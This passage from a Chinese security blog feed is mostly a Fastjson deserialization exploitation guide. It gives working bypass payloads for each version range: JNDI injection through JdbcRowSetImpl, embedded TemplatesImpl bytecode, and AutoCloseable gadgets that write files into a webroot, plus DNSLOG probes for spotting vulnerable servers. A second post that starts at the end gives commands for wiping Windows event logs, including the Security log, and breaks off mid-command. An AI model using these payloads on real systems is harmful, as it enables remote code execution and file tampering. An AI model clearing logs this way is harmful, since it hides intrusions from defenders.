1（L;法）1.2.25-1.2.41</h3><p>当autoTypeSupport开启或expectClass不为空时，会调用一个loadclass方法</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">if (this.autoTypeSupport || expectClass !&#x3D; null) &#123;</span><br><span class="line">    clazz &#x3D; TypeUtils.loadClass(typeName, this.defaultClassLoader);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>而在其中，若类名以L开头；结尾，则会把这两个字符去掉并加载类。</p><p>“至于为什么会有这种奇怪的处理，L 和 ; 这一对字符其实是 JVM 字节码中用来表示类名的：”</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">if (className.startsWith(&quot;L&quot;) &amp;&amp; className.endsWith(&quot;;&quot;)) &#123;</span><br><span class="line">    String newClassName &#x3D; className.substring(1, className.length() - 1);</span><br><span class="line">    return loadClass(newClassName, classLoader);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>所以在autotypesupport开启时，我们可以构造如下payload来bypass</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;&quot;@type&quot;:&quot;Lcom.sun.rowset.JdbcRowSetImpl;&quot;,&quot;dataSourceName&quot;:&quot;rmi:&#x2F;&#x2F;ip:1099&quot;,&quot;autoCommit&quot;:true&#125;</span><br></pre></td></tr></table></figure><p>如何开启autotypesupport？只需在json被解析前加入如下代码即可</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ParserConfig.getGlobalInstance().setAutoTypeSupport(true);</span><br></pre></td></tr></table></figure><h3 id="bypass-2（json内置）1-2-25-1-2-47"><a href="#bypass-2（json内置）1-2-25-1-2-47" class="headerlink" title="bypass 2（json内置）1.2.25-1.2.47"></a>bypass 2（json内置）1.2.25-1.2.47</h3><ul><li><p>1.2.25-1.2.32版本：未开启AutoTypeSupport时能成功利用，开启AutoTypeSupport反而不能成功触发；</p></li><li><p>1.2.33-1.2.47版本：无论是否开启AutoTypeSupport，都能成功利用；</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    &quot;a&quot;:&#123;</span><br><span class="line">        &quot;@type&quot;:&quot;java.lang.Class&quot;,</span><br><span class="line">        &quot;val&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span><br><span class="line">    &#125;,</span><br><span class="line">    &quot;b&quot;:&#123;</span><br><span class="line">        &quot;@type&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;,</span><br><span class="line">        &quot;dataSourceName&quot;:&quot;ldap:&#x2F;&#x2F;localhost:1389&#x2F;Exploit&quot;,</span><br><span class="line">        &quot;autoCommit&quot;:true</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul><h2 id="1-2-42"><a href="#1-2-42" class="headerlink" title="1.2.42"></a>1.2.42</h2><h3 id="更新机制-1"><a href="#更新机制-1" class="headerlink" title="更新机制"></a>更新机制</h3><p>42版本中开发人员将明文黑名单改成了hash黑名单，已经有人碰撞出了不少，意义不大；在处理25黑名单绕过的时候做了一个校验，如果类名以<code>L</code>开头，<code>;</code>结尾，则会用stubstring处理一下(这个判断是由HASH来判断的，看不懂，但我大受震撼）：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">if (((-3750763034362895579L ^ (long)className.charAt(0)) * 1099511628211L ^ (long)className.charAt(className.length() - 1)) * 1099511628211L &#x3D;&#x3D; 655701488918567152L) &#123;</span><br><span class="line">    className &#x3D; className.substring(1, className.length() - 1);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="bypass（双写绕过）"><a href="#bypass（双写绕过）" class="headerlink" title="bypass（双写绕过）"></a>bypass（双写绕过）</h3><p>那么直接一手双写绕过</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    &quot;@type&quot;:&quot;LLcom.sun.rowset.JdbcRowSetImpl;;&quot;,</span><br><span class="line">    &quot;dataSourceName&quot;:&quot;ldap:&#x2F;&#x2F;127.0.0.1:2357&#x2F;Command8&quot;,</span><br><span class="line">    &quot;autoCommit&quot;:true</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="1-2-42-1"><a href="#1-2-42-1" class="headerlink" title="1.2.42"></a>1.2.42</h2><h3 id="更新机制-2"><a href="#更新机制-2" class="headerlink" title="更新机制"></a>更新机制</h3><p>针对双写绕过套了个子判断。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">if (((-3750763034362895579L ^ (long)className.charAt(0)) * 1099511628211L ^ (long)className.charAt(className.length() - 1)) * 1099511628211L &#x3D;&#x3D; 655701488918567152L) &#123;</span><br><span class="line">                if (((-3750763034362895579L ^ (long)className.charAt(0)) * 1099511628211L ^ (long)className.charAt(1)) * 1099511628211L &#x3D;&#x3D; 655656408941810501L) &#123;</span><br><span class="line">                    throw new JSONException(&quot;autoType is not support. &quot; + typeName);</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                className &#x3D; className.substring(1, className.length() - 1);</span><br><span class="line">            &#125;</span><br></pre></td></tr></table></figure><h3 id="Bypass"><a href="#Bypass" class="headerlink" title="Bypass"></a>Bypass</h3><p>TypeUtils.loadClass 中除了对L;进行判断，还有对[进行了判断</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#125; else if (className.charAt(0) &#x3D;&#x3D; &#39;[&#39;) &#123;</span><br><span class="line">    Class&lt;?&gt; componentType &#x3D; loadClass(className.substring(1), classLoader);</span><br><span class="line">    return Array.newInstance(componentType, 0).getClass();</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p>围绕这个展开，构造如下payload，具体为啥这么构造没有细跟，反正跟[有关</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  &quot;@type&quot; : &quot;[com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&quot;[,&#123;</span><br><span class="line">  &quot;_bytecodes&quot; : [&quot;yv66vgAAADQAPQoADQAcCQAdAB4IAB8KACAAIQcAIggAIwoAJAAlCgAkACYKACcAKAcAKQoACgAqBwArBwAsAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEACXRyYW5zZm9ybQEAcihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEACkV4Y2VwdGlvbnMHAC0BAKYoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvZHRtL0RUTUF4aXNJdGVyYXRvcjtMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWAQAIPGNsaW5pdD4BAA1TdGFja01hcFRhYmxlBwApAQAKU291cmNlRmlsZQEACUV2aWwuamF2YQwADgAPBwAuDAAvADABAAVQd25lZAcAMQwAMgAzAQAQamF2YS9sYW5nL1N0cmluZwEABGNhbGMHADQMADUANgwANwA4BwA5DAA6ADsBABNqYXZhL2xhbmcvRXhjZXB0aW9uDAA8AA8BABJ0ZXN0X2Zhc3Rqc29uL0V2aWwBAEBjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvcnVudGltZS9BYnN0cmFjdFRyYW5zbGV0AQA5Y29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL1RyYW5zbGV0RXhjZXB0aW9uAQAQamF2YS9sYW5nL1N5c3RlbQEAA2VycgEAFUxqYXZhL2lvL1ByaW50U3RyZWFtOwEAE2phdmEvaW8vUHJpbnRTdHJlYW0BAAdwcmludGxuAQAVKExqYXZhL2xhbmcvU3RyaW5nOylWAQARamF2YS9sYW5nL1J1bnRpbWUBAApnZXRSdW50aW1lAQAVKClMamF2YS9sYW5nL1J1bnRpbWU7AQAEZXhlYwEAKChbTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvUHJvY2VzczsBABFqYXZhL2xhbmcvUHJvY2VzcwEAB3dhaXRGb3IBAAMoKUkBAA9wcmludFN0YWNrVHJhY2UAIQAMAA0AAAAAAAQAAQAOAA8AAQAQAAAAHQABAAEAAAAFKrcAAbEAAAABABEAAAAGAAEAAAAJAAEAEgATAAIAEAAAABkAAAADAAAAAbEAAAABABEAAAAGAAEAAAAXABQAAAAEAAEAFQABABIAFgACABAAAAAZAAAABAAAAAGxAAAAAQARAAAABgABAAAAHAAUAAAABAABABUACAAXAA8AAQAQAAAAawAEAAEAAAAmsgACEgO2AAQEvQAFWQMSBlNLuAAHKrYACLYACVenAAhLKrYAC7EAAQAIAB0AIAAKAAIAEQAAAB4ABwAAAAsACAANABIADgAdABEAIAAPACEAEAAlABIAGAAAAAcAAmAHABkEAAEAGgAAAAIAGw&quot;],</span><br><span class="line">  &quot;_name&quot; : &quot;a&quot;,</span><br><span class="line">  &quot;_tfactory&quot; : &#123;&#125;,</span><br><span class="line">  &quot;outputProperties&quot; : &#123;&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="1-2-44"><a href="#1-2-44" class="headerlink" title="1.2.44"></a>1.2.44</h2><h3 id="更新机制-3"><a href="#更新机制-3" class="headerlink" title="更新机制"></a>更新机制</h3><p>44版本针对43版本的绕过作了处理，[ 开头或者 L 开头 ; 结尾都会抛出异常</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210907182521116.png" alt="image-20210907182521116"></p><h3 id="Bypass-1"><a href="#Bypass-1" class="headerlink" title="Bypass"></a>Bypass</h3><p>JSON内置完美击破</p><h2 id="1-2-47-67"><a href="#1-2-47-67" class="headerlink" title="1.2.47-67"></a>1.2.47-67</h2><h3 id="更新机制-4"><a href="#更新机制-4" class="headerlink" title="更新机制"></a>更新机制</h3><p>由于47修复了JSON内置绕过，这些版本里也没啥很好的绕过方法，网上多是从黑名单中结合JNDI注入找漏网之鱼（找到的多为组件类，需要目标机器上有该组件才能打<a href="https://paper.seebug.org/1155/%EF%BC%89%E4%BB%A5%E5%8F%8AexpectClass%E7%BB%95%E8%BF%87AutoType">https://paper.seebug.org/1155/）以及expectClass绕过AutoType</a></p><h2 id="1-2-68"><a href="#1-2-68" class="headerlink" title="1.2.68"></a>1.2.68</h2><p>68版本之后出现了新的安全控制点safeMode，如果开启，在checkAtuoType的时候会直接抛出异常，只要设置@type类型，想反序列化指定类对象的时候，就会抛异常，也就是说开了safemod的站可以不用看了。<br>当然这个版本expectClass绕过AutoType是可以打一打的。</p><h3 id="Bypass-expectClass绕过AutoType-lt-1-2-68"><a href="#Bypass-expectClass绕过AutoType-lt-1-2-68" class="headerlink" title="Bypass expectClass绕过AutoType  &lt;=1.2.68"></a>Bypass expectClass绕过AutoType  &lt;=1.2.68</h3><p>这里通过一个demo展示一下.</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">package org.example;</span><br><span class="line"></span><br><span class="line">import java.io.IOException;</span><br><span class="line"></span><br><span class="line">public class VulAutoCloseable implements AutoCloseable &#123;</span><br><span class="line">    public VulAutoCloseable()&#123;</span><br><span class="line">        try &#123;</span><br><span class="line">            Runtime.getRuntime().exec(&quot;calc&quot;);</span><br><span class="line">        &#125; catch (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    @Override</span><br><span class="line">    public void close() throws Exception &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后我们的payload</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">public class evil &#123;</span><br><span class="line">        public static void main(String[] args)&#123;</span><br><span class="line">            System.out.println(JSON.parseObject(&quot;&#123;\&quot;@type\&quot;:\&quot;java.lang.AutoCloseable\&quot;,\&quot;@type\&quot;:\&quot;org.example.VulAutoCloseable\&quot;,\&quot;cmd\&quot;:\&quot;calc\&quot;&#125;\n&quot;));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>执行后弹计算器</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210907204915990.png" alt="image-20210907204915990"></p><p>我们通过调试来看看具体是怎么个回事</p><h4 id="调试"><a href="#调试" class="headerlink" title="调试"></a>调试</h4><p>于checkautotype 处下断点。</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210907224439952.png" alt="image-20210907224439952"></p><p>可以发现传入的typename是 AutoCloseable。此时的expectClass是NULL</p><p>往下，直接从缓存Mapping可以直接获得此类，</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210907224744679.png" alt="image-20210907224744679"></p><p>然后直接被return了，甚至没有走autoTypeSupport校验。</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210907225106968.png" alt="image-20210907225106968"></p><p>clazz被return到了defaultjsonparser里，往下看逻辑可以发现从对clazz进行了一个deserialze方法，跟进</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210907225448517.png" alt="image-20210907225448517"></p><p>会跟到这里来</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210908010408177.png" alt="image-20210908010408177"></p><p>往下看，会因为由Autocloseable不能通过getSeeAlso方法成功生成deserializer对象，从而触发第二轮checkAutoType</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210908013610732.png" alt="image-20210908013610732"></p><p>第二轮传入checkAutoType的参数依次为 第二个@type值，第一个@type值，和一个不重要的lexer.getFeatures()</p><p>进来checkAutoType后，会先对exceptclass进行白名单校验，Autocloseable类自然是随便过掉，然后使exceptClassFlag置为true</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210908013751407.png" alt="image-20210908013751407"></p><p>随后便是一些对typename的黑白名单校验，由于typename是org.example.VulAutoCloseable，不在黑白名单中，所以校验自然都通过了。<br>以下是依次的校验顺序</p><p>黑名单校验</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210908014110837.png" alt="image-20210908014110837"></p><p>先白后黑，其中所有的Array.binarySearch结果都是0，自然就能通过IF条件</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210908014001405.png" alt="image-20210908014001405"></p><p>先黑后白</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210908014440625.png" alt="image-20210908014440625"></p><p>冲破重重考研，typename指定类被传入TypeUtils.loadClass,跟进</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210908014625797.png" alt="image-20210908014625797"></p><p>会来到这里，VulAutoCloseable的类对象被返回</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210908015237563.png" alt="image-20210908015237563"></p><p>然后会对这个类对象进行校验，校验是否为ClassLoader、DataSource、RowSet等类的子类，是的话直接抛出异常，这也是过滤大多数JNDI注入Gadget的机制：</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210908015331781.png" alt="image-20210908015331781"></p><p>然后判断clazz是否是exceptClass的子类，是的话就直接返回类对象。类对象被返回后，就会进入被反序列化的下一个过程，它的构造方法等会被调用，从而完成利用。</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210908015543198.png" alt="image-20210908015543198"></p><h4 id="实战Gadget"><a href="#实战Gadget" class="headerlink" title="实战Gadget"></a>实战Gadget</h4><p>实战中用的payload:</p><p>文件移动：将一个文件中的内容移动到新的一个文件中去，原来文件的内容消失。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;dependency&gt;    &lt;groupId&gt;org.aspectj&lt;&#x2F;groupId&gt;    &lt;artifactId&gt;aspectjtools&lt;&#x2F;artifactId&gt;    &lt;version&gt;1.9.5&lt;&#x2F;version&gt;&lt;&#x2F;dependency&gt;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;&quot;@type&quot;:&quot;java.lang.AutoCloseable&quot;, &quot;@type&quot;:&quot;org.eclipse.core.internal.localstore.SafeFileOutputStream&quot;, &quot;tempPath&quot;:&quot;D:&#x2F;b.txt&quot;, &quot;targetPath&quot;:&quot;E:&#x2F;b.txt&quot;&#125;</span><br></pre></td></tr></table></figure><p>文件写入</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;dependency&gt;</span><br><span class="line">  &lt;groupId&gt;com.sleepycat&lt;&#x2F;groupId&gt;</span><br><span class="line">  &lt;artifactId&gt;je&lt;&#x2F;artifactId&gt;</span><br><span class="line">  &lt;version&gt;5.0.73&lt;&#x2F;version&gt;</span><br><span class="line">&lt;&#x2F;dependency&gt;</span><br><span class="line"></span><br><span class="line">&lt;dependency&gt;</span><br><span class="line">  &lt;groupId&gt;com.esotericsoftware&lt;&#x2F;groupId&gt;</span><br><span class="line">  &lt;artifactId&gt;kryo&lt;&#x2F;artifactId&gt;</span><br><span class="line">  &lt;version&gt;4.0.0&lt;&#x2F;version&gt;</span><br><span class="line">&lt;&#x2F;dependency&gt;</span><br><span class="line"></span><br><span class="line">&lt;dependency&gt;</span><br><span class="line">  &lt;groupId&gt;org.aspectj&lt;&#x2F;groupId&gt;</span><br><span class="line">  &lt;artifactId&gt;aspectjtools&lt;&#x2F;artifactId&gt;</span><br><span class="line">  &lt;version&gt;1.9.5&lt;&#x2F;version&gt;</span><br><span class="line">&lt;&#x2F;dependency&gt;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    &quot;stream&quot;: &#123;</span><br><span class="line">        &quot;@type&quot;: &quot;java.lang.AutoCloseable&quot;,</span><br><span class="line">        &quot;@type&quot;: &quot;org.eclipse.core.internal.localstore.SafeFileOutputStream&quot;,</span><br><span class="line">        &quot;targetPath&quot;: &quot;D:&#x2F;wamp64&#x2F;www&#x2F;hacked.txt&quot;, \\创建一个空文件</span><br><span class="line">        &quot;tempPath&quot;: &quot;D:&#x2F;wamp64&#x2F;www&#x2F;test.txt&quot;\\创建一个有内容的文件</span><br><span class="line">    &#125;,</span><br><span class="line">    &quot;writer&quot;: &#123;</span><br><span class="line">        &quot;@type&quot;: &quot;java.lang.AutoCloseable&quot;,</span><br><span class="line">        &quot;@type&quot;: &quot;com.esotericsoftware.kryo.io.Output&quot;,</span><br><span class="line">        &quot;buffer&quot;: &quot;cHduZWQ&#x3D;&quot;, \\base64后的文件内容</span><br><span class="line">        &quot;outputStream&quot;: &#123;</span><br><span class="line">            &quot;$ref&quot;: &quot;$.stream&quot;</span><br><span class="line">        &#125;,</span><br><span class="line">        &quot;position&quot;: 5</span><br><span class="line">    &#125;,</span><br><span class="line">    &quot;close&quot;: &#123;</span><br><span class="line">        &quot;@type&quot;: &quot;java.lang.AutoCloseable&quot;,</span><br><span class="line">        &quot;@type&quot;: &quot;com.sleepycat.bind.serial.SerialOutput&quot;,</span><br><span class="line">        &quot;out&quot;: &#123;</span><br><span class="line">            &quot;$ref&quot;: &quot;$.writer&quot;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="漏洞检测"><a href="#漏洞检测" class="headerlink" title="漏洞检测"></a>漏洞检测</h1><h3 id="DNSLOG"><a href="#DNSLOG" class="headerlink" title="DNSLOG"></a>DNSLOG</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;&quot;@type&quot;:&quot;java.net.InetAddress&quot;,&quot;val&quot;:&quot;dnslog.cn&quot;&#125; 在49以下才能触发，因为这个gadget在49被禁止了，可用于检测具体版本</span><br><span class="line">&#123;&quot;@type&quot;:&quot;java.net.Inet4Address&quot;,&quot;val&quot;:&quot;dnslog&quot;&#125;</span><br><span class="line">&#123;&quot;@type&quot;:&quot;java.net.Inet6Address&quot;,&quot;val&quot;:&quot;dnslog&quot;&#125;</span><br><span class="line">&#123;&quot;@type&quot;:&quot;java.net.InetSocketAddress&quot;&#123;&quot;address&quot;:,&quot;val&quot;:&quot;dnslog&quot;&#125;&#125;</span><br><span class="line">&#123;&quot;@type&quot;:&quot;com.alibaba.fastjson.JSONObject&quot;, &#123;&quot;@type&quot;: &quot;java.net.URL&quot;, &quot;val&quot;:&quot;dnslog&quot;&#125;&#125;&quot;&quot;&#125;</span><br><span class="line">&#123;&#123;&quot;@type&quot;:&quot;java.net.URL&quot;,&quot;val&quot;:&quot;dnslog&quot;&#125;:&quot;aaa&quot;&#125;</span><br><span class="line">Set[&#123;&quot;@type&quot;:&quot;java.net.URL&quot;,&quot;val&quot;:&quot;dnslog&quot;&#125;]</span><br><span class="line">Set[&#123;&quot;@type&quot;:&quot;java.net.URL&quot;,&quot;val&quot;:&quot;dnslog&quot;&#125;</span><br><span class="line">&#123;&#123;&quot;@type&quot;:&quot;java.net.URL&quot;,&quot;val&quot;:&quot;dnslog&quot;&#125;:0</span><br></pre></td></tr></table></figure><h3 id="报错检测"><a href="#报错检测" class="headerlink" title="报错检测"></a>报错检测</h3><p>运气好可以直接出版本号</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;&quot;xxx&quot;:&quot;aaa&quot;</span><br><span class="line">eyJhIjoiXHgaGiJ9的base64解码 在60以下才能触发，当后端 Fastjson 版本小于 1.2.60 时，使用该请求包不会延时不会报错，反之则会延迟或报错</span><br></pre></td></tr></table></figure><h3 id="建议"><a href="#建议" class="headerlink" title="建议"></a>建议</h3><p>有些开发人员在写解析JSON的相关代码时，可能会设置只能传入指定对象。<br>而我们通过设置@type时传入的对象可能会与指定对象不匹配从而发生type not match的异常。</p><p>解决办法是这样,最外层套层对象</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">&quot;xxx&quot;: &#123;&quot;@type&quot;:&quot;java.net.InetAddress&quot;,&quot;val&quot;:&quot;dnslog&quot;&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a href="https://c014.cn/pdfs/java/Fastjson/Fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E.html">https://c014.cn/pdfs/java/Fastjson/Fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E.html</a></p><p><a href="https://www.freebuf.com/vuls/228099.html">https://www.freebuf.com/vuls/228099.html</a></p><p><a href="https://aluvion.gitee.io/2020/08/23/Fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%9C%BA%E5%88%B6%E5%92%8Cautotype%E8%A7%82%E6%B5%8B/#1-2-25-lt-Fastjson-lt-1-2-41-checkAutoType-%E9%BB%91%E5%90%8D%E5%8D%95%E7%BB%95%E8%BF%87">https://aluvion.gitee.io/2020/08/23/Fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%9C%BA%E5%88%B6%E5%92%8Cautotype%E8%A7%82%E6%B5%8B/#1-2-25-lt-Fastjson-lt-1-2-41-checkAutoType-%E9%BB%91%E5%90%8D%E5%8D%95%E7%BB%95%E8%BF%87</a></p><p><a href="https://paper.seebug.org/1192/#1225">https://paper.seebug.org/1192/#1225</a></p><p><a href="https://www.mi1k7ea.com/2019/11/11/Fastjson%E7%B3%BB%E5%88%97%E5%9B%9B%E2%80%94%E2%80%941-2-25-1-2-47%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%EF%BC%88%E6%97%A0%E9%9C%80%E5%BC%80%E5%90%AFAutoType%EF%BC%89/#%E4%B8%8D%E5%8F%97AutoTypeSupport%E5%BD%B1%E5%93%8D%E7%9A%84%E7%89%88%E6%9C%AC">https://www.mi1k7ea.com/2019/11/11/Fastjson%E7%B3%BB%E5%88%97%E5%9B%9B%E2%80%94%E2%80%941-2-25-1-2-47%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%EF%BC%88%E6%97%A0%E9%9C%80%E5%BC%80%E5%90%AFAutoType%EF%BC%89/#%E4%B8%8D%E5%8F%97AutoTypeSupport%E5%BD%B1%E5%93%8D%E7%9A%84%E7%89%88%E6%9C%AC</a></p><p><a href="https://www.mi1k7ea.com/2021/02/08/Fastjson%E7%B3%BB%E5%88%97%E5%85%AD%E2%80%94%E2%80%941-2-48-1-2-68%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/#0x04-1-2-68%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%EF%BC%88expectClass%E7%BB%95%E8%BF%87AutoType%EF%BC%89">https://www.mi1k7ea.com/2021/02/08/Fastjson%E7%B3%BB%E5%88%97%E5%85%AD%E2%80%94%E2%80%941-2-48-1-2-68%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/#0x04-1-2-68%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%EF%BC%88expectClass%E7%BB%95%E8%BF%87AutoType%EF%BC%89</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;FastJSON-简介&quot;&gt;&lt;a href=&quot;#FastJSON-简介&quot; class=&quot;headerlink&quot; title=&quot;FastJSON 简介&quot;&gt;&lt;/a&gt;FastJSON 简介&lt;/h1&gt;&lt;p&gt;FastJson 是一个由阿里巴巴研发的java库，可以把java对</summary>
      
    
    
    
    
    <category term="java开发与安全" scheme="http://const27.com/tags/java%E5%BC%80%E5%8F%91%E4%B8%8E%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>win&amp;linux 日志系统与清除</title>
    <link href="http://const27.com/2021/09/03/windows&amp;linux%E6%97%A5%E5%BF%97%E7%B3%BB%E7%BB%9F%E4%B8%8E%E6%B8%85%E9%99%A4/"/>
    <id>http://const27.com/2021/09/03/windows&amp;linux%E6%97%A5%E5%BF%97%E7%B3%BB%E7%BB%9F%E4%B8%8E%E6%B8%85%E9%99%A4/</id>
    <published>2021-09-03T13:09:34.996Z</published>
    <updated>2021-09-03T13:17:41.118Z</updated>
    
    <content type="html"><![CDATA[<h1 id="WINDOWS-日志"><a href="#WINDOWS-日志" class="headerlink" title="WINDOWS 日志"></a>WINDOWS 日志</h1><p>Windows日志有许多细分类：<br>windows事件日志，IIS日志，FTP日志，防火墙日志等等。</p><h2 id="事件查看器"><a href="#事件查看器" class="headerlink" title="事件查看器"></a>事件查看器</h2><p>windows系统自带一个叫做事件查看器的工具，它可以分析所有的windows系统日志。<br>运行-&gt;eventvwr 即可打开。<br>它把日志分为了两种，一个是WINDOWS日志，一个是“应用程序和服务日志”</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210726133040331.png" alt="image-20210726133040331"></p><p>事件查看器内置有三个核心日志文件：SYSTEM,SECURITY,APPLICATION。他们的默认最大容量为20MB.</p><h3 id="事件类型"><a href="#事件类型" class="headerlink" title="事件类型"></a>事件类型</h3><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210726133715232.png" alt="image-20210726133715232"></p><p>事件查看器把时间分类为了五种类型：</p><p>信息（Information）</p><p>信息事件指应用程序、驱动程序或服务的成功操作的事件。</p><p>警告（Warning）</p><p>警告事件指不是直接的、主要的，但是会导致将来问题发生的问题。例如，当磁盘空间不足或未找到打印机时，都会记录一个“警告”事件。</p><p>错误（Error）</p><p>错误事件指用户应该知道的重要的问题。错误事件通常指功能和数据的丢失。例如,如果一个服务不能作为系统引导被加载，那么它会产生一个错误事件。</p><p>成功审核（Success audit）</p><p>成功的审核安全访问尝试，主要是指安全性日志，这里记录着用户登录/注销、对象访问、特权使用、账户管理、策略更改、详细跟踪、目录服务访问、账户登录等事件，例如所有的成功登录系统都会被记录为“ 成功审核”事件。</p><p>失败审核（Failure audit）</p><p>失败的审核安全登录尝试，例如用户试图访问网络驱动器失败，则该尝试会被作为失败审核事件记录下来。</p><h2 id="删除日志"><a href="#删除日志" class="headerlink" title="删除日志"></a>删除日志</h2><p>Windows并没有直接提供删除特点日志的功能，事件查看器也只提供了一个清除日志的选项，原因是日志记录的ID是连续的，默认的排序方式是从大到小往下排列。</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210726134334720.png" alt="image-20210726134334720"></p><h3 id="清空日志"><a href="#清空日志" class="headerlink" title="清空日志"></a>清空日志</h3><p>暴力一点，可以直接把日志全部删除。</p><p>开始→运行,输入 <code>eventvwr</code> 进入事件查看器，右边栏选择清除日志。</p><p>或者通过powershell选定日志删除</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">（a）PowerShell -Command &quot;&amp; &#123;Clear-Eventlog -Log Application,System,Security,&#39;windows powershell&#39;&#125;&quot;</span><br><span class="line">（b）Get-WinEvent -ListLog Application,Setup,Security -Force | % &#123;Wevtutil.exe cl $_.Logname&#125;</span><br></pre></td></tr></table></figure><p>嫌powershell太长可以用wevtutil</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">wevtutil el             列出系统中所有日志名称</span><br><span class="line">wevtutil cl system      清理系统日志</span><br><span class="line">wevtutil cl application 清理应用程序日志</span><br><span class="line">wevtutil cl security    